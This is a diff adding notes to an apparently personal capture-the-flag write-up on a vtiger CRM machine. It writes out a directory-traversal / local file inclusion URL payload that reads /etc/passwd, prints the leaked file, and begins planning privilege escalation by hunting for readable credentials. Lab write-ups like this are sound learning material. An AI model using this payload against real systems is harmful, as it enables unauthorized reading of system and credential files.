@@ -89,4 +89,24 @@ Sure enough, I can read files now.
 
 ![[Pasted image 20220113213426.png]]
 
+After some testing, it looks like we only need to go up 4 directories in the directory traversal: `/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../etc/passwd%00`
 
+Contents of `/etc/passwd`
+```bash
+root:x:0:0:root:/root:/bin/bash
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
+asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
+fanis:x:501:501::/home/fanis:/bin/bash
+```
+
+I was able to get the user flag using LFI
+
+![[Pasted image 20220113215313.png]]
+
+# Privilege Escalation.
+
+I still don't have command execution. I should probably look around at other files to see if any credentials can be read.
